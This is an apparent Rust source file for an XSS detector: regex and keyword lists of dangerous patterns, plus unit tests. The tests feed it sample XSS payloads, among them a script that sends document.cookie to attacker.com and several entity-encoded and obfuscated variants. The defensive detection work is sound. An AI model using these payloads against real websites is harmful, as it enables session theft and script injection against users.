use crate::detectors::detector_trait::InputDetector;
use once_cell::sync::Lazy;
use regex::Regex;
use std::collections::HashSet;

// Static regex patterns for better performance
static ATTRIBUTE_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)(src|href|style|action)\s*=\s*["']?[^"'>\s]*["']?"#).unwrap()
});

static SCRIPT_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)<\s*script[^>]*>[\s\S]*?<\s*/\s*script\s*>"#).unwrap()
});

static JAVASCRIPT_URI_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)javascript\s*:"#).unwrap()
});

static DATA_URI_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"(?i)data\s*:[^,]*?base64"#).unwrap()
});

static HTML_ENTITIES_REGEX: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"&#(?:x[0-9a-fA-F]+|[0-9]+);"#).unwrap()
});

/// Detector for Cross-Site Scripting (XSS) attacks
///
/// Detects attempts to inject malicious JavaScript that could execute in browsers.
/// Looks for script tags, event handlers, javascript: URLs, and other common XSS vectors.
pub struct XssDetector {
    dangerous_patterns: Vec<&'static str>,
    html_event_handlers: HashSet<&'static str>,
}

impl XssDetector {
    /// Create a new instance of the XSS detector
    pub fn new() -> Self {
        // Common XSS patterns to look for
        let dangerous_patterns = vec![
            "<script", "</script>", "javascript:", "onerror=", "onload=",
            "eval(", "document.cookie", "document.location", "document.write",
            "fromcharcode", "alert(", "String.fromCharCode", "&#", "\\u00",
            "onmouseover=", "onclick=", "onmouseout=", "onkeypress=",
        ];

        // HTML event handlers commonly used in XSS
        let html_event_handlers = [
            "onabort", "onblur", "onchange", "onclick", "ondblclick", "onerror",
            "onfocus", "onkeydown", "onkeypress", "onkeyup", "onload", "onmousedown",
            "onmousemove", "onmouseout", "onmouseover", "onmouseup", "onreset",
            "onresize", "onscroll", "onselect", "onsubmit", "onunload",
        ].iter().cloned().collect();

        XssDetector {
            dangerous_patterns,
            html_event_handlers,
        }
    }

    /// Check if input contains potentially malicious HTML tags
    fn contains_dangerous_tags(&self, input: &str) -> bool {
        // Look for common dangerous patterns
        for pattern in &self.dangerous_patterns {
            if input.to_lowercase().contains(&pattern.to_lowercase()) {
                return true;
            }
        }

        // Check for HTML event handlers (like onload, onclick, etc.)
        for handler in &self.html_event_handlers {
            // Look for handlers with pattern "onXXX=" or "onXXX ("
            let handler_equals = format!("{}=", handler);
            let handler_space = format!("{} ", handler);
            
            if input.to_lowercase().contains(&handler_equals.to_lowercase()) || 
               input.to_lowercase().contains(&handler_space.to_lowercase()) {
                return true;
            }
        }

        false
    }

    /// Check if input contains suspicious attributes that could execute JavaScript
    fn contains_suspicious_attributes(&self, input: &str) -> bool {
        if ATTRIBUTE_REGEX.is_match(input) {
            // Check if any attributes contain suspicious JavaScript content
            for cap in ATTRIBUTE_REGEX.captures_iter(input) {
                let attr_content = cap.get(0).unwrap().as_str();
                if attr_content.to_lowercase().contains("javascript") || 
                   attr_content.to_lowercase().contains("eval") ||
                   attr_content.to_lowercase().contains("expression") ||
                   DATA_URI_REGEX.is_match(attr_content) {
                    return true;
                }
            }
        }
        
        false
    }

    /// Check for obfuscation techniques commonly used to bypass XSS filters
    fn detect_obfuscation(&self, input: &str) -> bool {
        // Check for HTML entity encoding
        if HTML_ENTITIES_REGEX.is_match(input) {
            // Entities combined with script tags or event handlers may indicate obfuscation
            if input.contains("<") || input.contains(">") || 
               input.to_lowercase().contains("on") || input.to_lowercase().contains("script") {
                return true;
            }
        }
        
        // Check for Unicode escape sequences often used to obfuscate
        if input.contains("\\u00") {
            return true;
        }
        
        // Check for excessive use of unusual characters (potential obfuscation)
        let unusual_chars = ['^', '`', '{', '}', '|', '~'].iter()
            .filter(|c| input.contains(**c))
            .count();
            
        if unusual_chars >= 3 && (input.contains("<") || input.contains(">")) {
            return true;
        }
        
        false
    }

    /// Check for various JavaScript URI schemes
    fn detect_javascript_uri(&self, input: &str) -> bool {
        // Check for javascript: URI scheme
        if JAVASCRIPT_URI_REGEX.is_match(input) {
            return true;
        }
        
        // Check for data: URI scheme with potentially executable content
        if DATA_URI_REGEX.is_match(input) {
            return true;
        }
        
        // Check for vbscript: URI scheme
        if input.to_lowercase().contains("vbscript:") {
            return true;
        }
        
        false
    }
}

impl InputDetector for XssDetector {
    fn detect(&self, input: &str) -> bool {
        if input.trim().is_empty() {
            return false;
        }
        
        // Check for script tags
        if SCRIPT_REGEX.is_match(input) {
            return true;
        }
        
        // Check for other dangerous HTML tags
        if self.contains_dangerous_tags(input) {
            return true;
        }
        
        // Check for suspicious attributes
        if self.contains_suspicious_attributes(input) {
            return true;
        }
        
        // Check for JavaScript URI schemes
        if self.detect_javascript_uri(input) {
            return true;
        }
        
        // Check for obfuscation techniques
        if self.detect_obfuscation(input) {
            return true;
        }
        
        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_inputs() {
        let detector = XssDetector::new();
        
        // Safe inputs should not be flagged
        assert!(!detector.detect("Hello world"), "Safe text should not be flagged");
        assert!(!detector.detect("This is <strong>bold</strong> text"), "Basic HTML formatting should not be flagged");
        assert!(!detector.detect("<p>Regular paragraph</p>"), "Regular HTML tags should not be flagged");
        assert!(!detector.detect("user@example.com"), "Email should not be flagged");
        assert!(!detector.detect("https://example.com/path?query=value"), "URLs should not be flagged");
        assert!(!detector.detect("<a href=\"https://example.com\">Link</a>"), "Regular links should not be flagged");
    }

    #[test]
    fn test_script_tags() {
        let detector = XssDetector::new();
        
        // Test script tag detection
        assert!(detector.detect("<script>alert(1)</script>"), "Basic script tag should be detected");
        assert!(detector.detect("<script src=\"evil.js\"></script>"), "External script should be detected");
        assert!(detector.detect("<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"), "Cookie stealing script should be detected");
        assert!(detector.detect("<ScRiPt>alert(1)</sCrIpT>"), "Mixed case script tag should be detected");
        assert!(detector.detect("<img src=\"x\" onerror=\"alert(1)\">"), "Onerror event handler should be detected");
    }

    #[test]
    fn test_event_handlers() {
        let detector = XssDetector::new();
        
        // Test event handler detection
        assert!(detector.detect("<body onload=\"alert(1)\">"), "Onload event handler should be detected");
        assert!(detector.detect("<a onmouseover=\"alert(1)\">hover me</a>"), "Onmouseover event handler should be detected");
        assert!(detector.detect("<div onclick=\"alert(document.cookie)\">click me</div>"), "Onclick with cookie access should be detected");
        assert!(detector.detect("<svg onload=alert(1)>"), "SVG onload should be detected");
        assert!(detector.detect("<iframe onload=\"alert(1)\">"), "Iframe onload should be detected");
    }

    #[test]
    fn test_uri_schemes() {
        let detector = XssDetector::new();
        
        // Test URI scheme detection
        assert!(detector.detect("<a href=\"javascript:alert(1)\">click me</a>"), "JavaScript URI scheme should be detected");
        assert!(detector.detect("javascript:alert(document.domain)"), "Bare JavaScript URI should be detected");
        assert!(detector.detect("<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">click me</a>"), "Data URI with base64 script should be detected");
        assert!(detector.detect("<a href=\"vbscript:alert(1)\">click me</a>"), "VBScript URI should be detected");
        assert!(detector.detect("<iframe src=\"javascript:alert(1)\">"), "Iframe with JavaScript URI should be detected");
    }

    #[test]
    fn test_obfuscation_techniques() {
        let detector = XssDetector::new();
        
        // Test obfuscation detection
        assert!(detector.detect("<a href=\"&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\">click me</a>"), "HTML entity encoded JavaScript URI should be detected");
        assert!(detector.detect("<img src=\"x\" onerror=\"eval(String.fromCharCode(97,108,101,114,116,40,49,41))\">"), "String.fromCharCode should be detected");
        assert!(detector.detect("<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>"), "Unicode escapes should be detected");
        assert!(detector.detect("<div onclick=\"al\\u0065rt(1)\">click me</div>"), "Unicode escapes in event handler should be detected");
        assert!(detector.detect("<script>document[(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]].cookie</script>"), "Heavily obfuscated script should be detected");
    }
} 